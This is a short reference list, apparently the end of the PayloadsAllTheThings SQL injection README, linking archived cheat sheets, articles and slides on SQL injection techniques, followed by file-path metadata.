  * [Implement a Blind Error-Based SQLMap payload for SQLite - soka - August 24, 2023](https://web.archive.org/web/20250513112724/https://sokarepo.github.io/web/2023/08/24/implement-blind-sqlite-sqlmap.html)\n\
  * [Manual SQL Injection Discovery Tips - Gerben Javado - August 26, 2017](https://web.archive.org/web/20170826221724/https://gerbenjavado.com/manual-sql-injection-discovery-tips/)\n\
  * [NetSPI SQL Injection Wiki - NetSPI - December 21, 2017](https://web.archive.org/web/20171221044609/https://sqlwiki.netspi.com/)\n\
  * [PentestMonkey's mySQL injection cheat sheet - @pentestmonkey - August 15, 2011](https://web.archive.org/web/20260109024910/https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)\n\
  * [SQLi Cheatsheet - NetSparker - March 19, 2022](https://web.archive.org/web/20220219223426/https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)\n\
  * [SQLi in INSERT worse than SELECT - Mathias Karlsson - February 14, 2017](https://web.archive.org/web/20231004093323/https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)\n\
  * [SQLi Optimization and Obfuscation Techniques - Roberto Salgado - July 31, 2013](https://web.archive.org/web/20221005232819/https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf)\n\
  * [The SQL Injection Knowledge base - Roberto Salgado - May 29, 2013](https://web.archive.org/web/20260302110304/https://www.websec.ca/kb/sql_injection)"
_relative_path: SQL Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/README.md
````
